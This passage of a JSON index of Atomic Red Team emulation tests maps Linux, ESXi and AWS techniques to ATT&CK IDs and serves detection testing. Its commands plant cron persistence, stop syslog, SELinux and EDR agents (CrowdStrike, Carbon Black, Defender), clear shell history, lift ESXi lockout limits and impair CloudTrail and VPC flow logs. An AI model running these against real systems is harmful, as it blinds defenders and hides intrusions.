      "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n",
      "cleanup_command": "rm /etc/cron.daily/#{cron_script_name} -f\nrm /etc/cron.hourly/#{cron_script_name} -f\nrm /etc/cron.monthly/#{cron_script_name} -f\nrm /etc/cron.weekly/#{cron_script_name} -f\n"
    },
    "input_arguments": {
      "command": {
        "description": "Command to execute",
        "type": "string",
        "default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
      },
      "cron_script_name": {
        "description": "Name of file to store in cron folder",
        "type": "string",
        "default": "persistevil"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
    "indexed_technique": "T1053.003.02",
    "technique_index": 2,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1053.003",
    "display_name": "Scheduled Task/Job: Cron",
    "source_file": "T1053.003.yaml",
    "test_name": "Cron - Add script to /etc/cron.d folder",
    "test_guid": "078e69eb-d9fb-450e-b9d0-2e118217c846",
    "description": "This test adds a script to /etc/cron.d folder configured to execute on a schedule.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "name": "sh",
      "command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}\n",
      "cleanup_command": "rm /etc/cron.d/#{cron_script_name} -f\n"
    },
    "input_arguments": {
      "command": {
        "description": "Command to execute",
        "type": "string",
        "default": "echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log"
      },
      "cron_script_name": {
        "description": "Name of file to store in cron folder",
        "type": "string",
        "default": "persistevil"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test adds a script to /etc/cron.d folder configured to execute on a schedule.\n",
    "indexed_technique": "T1053.003.03",
    "technique_index": 3,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1053.003",
    "display_name": "Scheduled Task/Job: Cron",
    "source_file": "T1053.003.yaml",
    "test_name": "Cron - Add script to /var/spool/cron/crontabs/ folder",
    "test_guid": "2d943c18-e74a-44bf-936f-25ade6cccab4",
    "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "name": "bash",
      "command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}\n",
      "cleanup_command": "rm /var/spool/cron/crontabs/#{cron_script_name} -f\n"
    },
    "input_arguments": {
      "command": {
        "description": "Command to execute",
        "type": "string",
        "default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"
      },
      "cron_script_name": {
        "description": "Name of file to store in /var/spool/cron/crontabs folder",
        "type": "string",
        "default": "persistevil"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n",
    "indexed_technique": "T1053.003.04",
    "technique_index": 4,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1090.003",
    "display_name": "Proxy: Multi-hop Proxy",
    "source_file": "T1090.003.yaml",
    "test_name": "Tor Proxy Usage - Debian/Ubuntu/FreeBSD",
    "test_guid": "5ff9d047-6e9c-4357-b39b-5cf89d9b59c7",
    "description": "This test launches the Tor proxy service using systemctl.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor\n",
      "cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Tor must be installed on the machine \n",
        "prereq_command": "if [ -x \"$(command -v tor --version)\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "(which apt && sudo apt-get -y install tor) || (which pkg && pkg install -y tor)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
    "indexed_technique": "T1090.003.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1030",
    "display_name": "Data Transfer Size Limits",
    "source_file": "T1030.yaml",
    "test_name": "Data Transfer Size Limits",
    "test_guid": "ab936c51-10f4-46ce-9144-e02137b2016a",
    "description": "Take a file (T1030_urandom), split it into 5Mb chunks\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "cd #{folder_path}; split -b 5000000 #{file_name}\nls -l #{folder_path}\n",
      "cleanup_command": "if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_name": {
        "description": "File name",
        "type": "path",
        "default": "T1030_urandom"
      },
      "folder_path": {
        "description": "Path where the test creates artifacts",
        "type": "path",
        "default": "/tmp/T1030"
      }
    },
    "dependencies": [
      {
        "description": "The file must exist for the test to run.",
        "prereq_command": "if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else exit 0; fi;\n",
        "get_prereq_command": "if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path}; touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name} bs=25000000 count=1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Take a file/directory, split it into 5Mb chunks\n",
    "indexed_technique": "T1030.01",
    "technique_index": 1,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1562.006",
    "display_name": "Impair Defenses: Indicator Blocking",
    "source_file": "T1562.006.yaml",
    "test_name": "Auditing Configuration Changes on Linux Host",
    "test_guid": "212cfbcf-4770-4980-bc21-303e37abd0e3",
    "description": "This test appends a comment to the end of the `audispd.conf`, `auditd.conf`, and `libaudit.conf` configuration files.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n",
      "cleanup_command": "sed -i '$ d' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{auditd_config_file_name}\nelse sed -i '$ d' /etc/audit/#{auditd_config_file_name}\nfi\nsed -i '$ d' /etc/#{libaudit_config_file_name}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "audisp_config_file_name": {
        "description": "The name of the audispd configuration file to be changed",
        "type": "string",
        "default": "audispd.conf"
      },
      "auditd_config_file_name": {
        "description": "The name of the auditd configuration file to be changed",
        "type": "string",
        "default": "auditd.conf"
      },
      "libaudit_config_file_name": {
        "description": "The name of the libaudit configuration file to be changed",
        "type": "string",
        "default": "libaudit.conf"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Emulates modification of auditd configuration files\n",
    "indexed_technique": "T1562.006.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.006",
    "display_name": "Impair Defenses: Indicator Blocking",
    "source_file": "T1562.006.yaml",
    "test_name": "Logging Configuration Changes on Linux Host",
    "test_guid": "7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c",
    "description": "Logging syslog configuration Changes on Linux Host.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n",
      "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "syslog_config_file_name": {
        "description": "The name of the syslog configuration file to be changed",
        "type": "string",
        "default": "syslog.conf"
      },
      "rsyslog_config_file_name": {
        "description": "The name of the rsyslog configuration file to be changed",
        "type": "string",
        "default": "rsyslog.conf"
      },
      "syslog_ng_config_file_name": {
        "description": "The name of the syslog-ng configuration file to be changed",
        "type": "string",
        "default": "syslog-ng.conf"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Emulates modification of syslog configuration.\n",
    "indexed_technique": "T1562.006.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Disable syslog",
    "test_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8",
    "description": "Disables syslog collection\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "#{flavor_command}\n",
      "cleanup_command": "#{cleanup_command}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "package_checker": {
        "description": "Package checking command for linux.",
        "type": "string",
        "default": "(rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)"
      },
      "package_installer": {
        "description": "Package installer command for linux. Default yum",
        "type": "string",
        "default": "(which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)"
      },
      "flavor_command": {
        "description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog",
        "type": "string",
        "default": "systemctl stop rsyslog ; systemctl disable rsyslog"
      },
      "cleanup_command": {
        "description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on",
        "type": "string",
        "default": "systemctl start rsyslog ; systemctl enable rsyslog"
      }
    },
    "dependencies": [
      {
        "description": "Package with rsyslog must be on system\n",
        "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "sudo #{package_installer} \n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Disables syslog collection\n",
    "indexed_technique": "T1562.001.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Disable Cb Response",
    "test_guid": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8",
    "description": "Disable the Cb Response service\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Disable the Cb Response service\n",
    "indexed_technique": "T1562.001.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Disable SELinux",
    "test_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8",
    "description": "Disables SELinux enforcement\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "setenforce 0\n",
      "cleanup_command": "setenforce 1\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "SELinux must be installed\n",
        "prereq_command": "which setenforce\n",
        "get_prereq_command": "echo \"SELinux is not installed\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Disables SELinux enforcement\n",
    "indexed_technique": "T1562.001.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Stop Crowdstrike Falcon on Linux",
    "test_guid": "828a1278-81cc-4802-96ab-188bf29ca77d",
    "description": "Stop and disable Crowdstrike Falcon on Linux\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n",
      "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Stop and disable Crowdstrike Falcon on Linux\n",
    "indexed_technique": "T1562.001.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Clear History",
    "test_guid": "23b88394-091b-4968-a42d-fb8076992443",
    "description": "Clear Shell History.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "history -c\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Clear Shell History. This technique only affect the bash shell application. \n",
    "indexed_technique": "T1562.001.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Suspend History",
    "test_guid": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4",
    "description": "suspend Shell History.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "set +o history\n",
      "cleanup_command": "set -o history\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
    "indexed_technique": "T1562.001.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Reboot Linux Host via Kernel System Request",
    "test_guid": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e",
    "description": "Reboot Linux Host via Kernel System Request.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "reboot system via system request seen in Awfulshred wiper.\n",
    "indexed_technique": "T1562.001.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Clear Pagging Cache",
    "test_guid": "f790927b-ea85-4a16-b7b2-7eb44176a510",
    "description": "clear pagging cache via system request.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
    "indexed_technique": "T1562.001.08",
    "technique_index": 8,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Disable Memory Swap",
    "test_guid": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114",
    "description": "disables all active memory swap devices on the system.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "swapon -a \nsleep 2\nswapoff -a\nsync\n",
      "cleanup_command": "swapon -a\nsleep 2\nsync\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n",
    "indexed_technique": "T1562.001.09",
    "technique_index": 9,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "Tamper with Defender ATP on Linux/MacOS",
    "test_guid": "40074085-dbc8-492b-90a3-11bcfc52fda8",
    "description": "disables real-time protection for Microsoft Defender ATP",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "sudo mdatp config real-time-protection --value disabled\n",
      "cleanup_command": "sudo mdatp config real-time-protection --value enabled\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n",
    "indexed_technique": "T1562.001.10",
    "technique_index": 10,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.001",
    "display_name": "Impair Defenses: Disable or Modify Tools",
    "source_file": "T1562.001.yaml",
    "test_name": "ESXi - Disable Account Lockout Policy via PowerCLI",
    "test_guid": "091a6290-cd29-41cb-81ea-b12f133c66cb",
    "description": "Disable Account Lockout Policy via PowerCLI.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n",
      "name": "powershell",
      "elevation_required": true
    },
    "input_arguments": {
      "vm_host": {
        "description": "Specify the host name of the ESXi Server",
        "type": "string",
        "default": "atomic.local"
      },
      "vm_user": {
        "description": "Specify the privilege user account on ESXi Server",
        "type": "string",
        "default": "root"
      },
      "vm_pass": {
        "description": "Specify the privilege user password on ESXi Server",
        "type": "string",
        "default": "pass"
      }
    },
    "dependencies": [
      {
        "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
        "prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
        "get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
      }
    ],
    "dependency_executor_name": "powershell",
    "original_description": "An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.\n",
    "indexed_technique": "T1562.001.11",
    "technique_index": 11,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.008",
    "display_name": "Impair Defenses: Disable Cloud Logs",
    "source_file": "T1562.008.yaml",
    "test_name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus",
    "test_guid": "a27418de-bdce-4ebd-b655-38f11142bf0c",
    "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events. ",
    "supported_platforms": [
      "linux",
      "macos",
      "iaas:aws"
    ],
    "executor": {
      "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n",
      "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "stratus_path": {
        "description": "Path of stratus binary",
        "type": "path",
        "default": "$PathToAtomicsFolder/T1562.008/src"
      },
      "aws_region": {
        "description": "AWS region to detonate",
        "type": "string",
        "default": "us-west-2"
      }
    },
    "dependencies": [
      {
        "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
        "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
      },
      {
        "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
        "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
        "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
    "indexed_technique": "T1562.008.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.008",
    "display_name": "Impair Defenses: Disable Cloud Logs",
    "source_file": "T1562.008.yaml",
    "test_name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus",
    "test_guid": "22d89a2f-d475-4895-b2d4-68626d49c029",
    "description": "This test uses Stratus Red Team in $PathToAtomicsFolder/T1562.008/src to set up CloudTrail logging to an S3 bucket in us-west-2 and applies a lifecycle rule to expire logs after one day.",
    "supported_platforms": [
      "linux",
      "macos",
      "iaas:aws"
    ],
    "executor": {
      "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n",
      "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "stratus_path": {
        "description": "Path of stratus binary",
        "type": "path",
        "default": "$PathToAtomicsFolder/T1562.008/src"
      },
      "aws_region": {
        "description": "AWS region to detonate",
        "type": "string",
        "default": "us-west-2"
      }
    },
    "dependencies": [
      {
        "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
        "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
      },
      {
        "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
        "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
        "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
    "indexed_technique": "T1562.008.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.008",
    "display_name": "Impair Defenses: Disable Cloud Logs",
    "source_file": "T1562.008.yaml",
    "test_name": "AWS - Remove VPC Flow Logs using Stratus",
    "test_guid": "93c150f5-ad7b-4ee3-8992-df06dec2ac79",
    "description": "This test uses Stratus Red Team in $PathToAtomicsFolder/T1562.008/src to remove AWS VPC Flow Logs configuration in us-west-2.",
    "supported_platforms": [
      "linux",
      "macos",
      "iaas:aws"
    ],
    "executor": {
      "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n",
      "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "stratus_path": {
        "description": "Path of stratus binary",
        "type": "path",
        "default": "$PathToAtomicsFolder/T1562.008/src"
      },
      "aws_region": {
        "description": "AWS region to detonate",
        "type": "string",
        "default": "us-west-2"
      }
    },
    "dependencies": [
      {
        "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
        "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
      },
      {
        "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
        "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
        "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
    "indexed_technique": "T1562.008.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
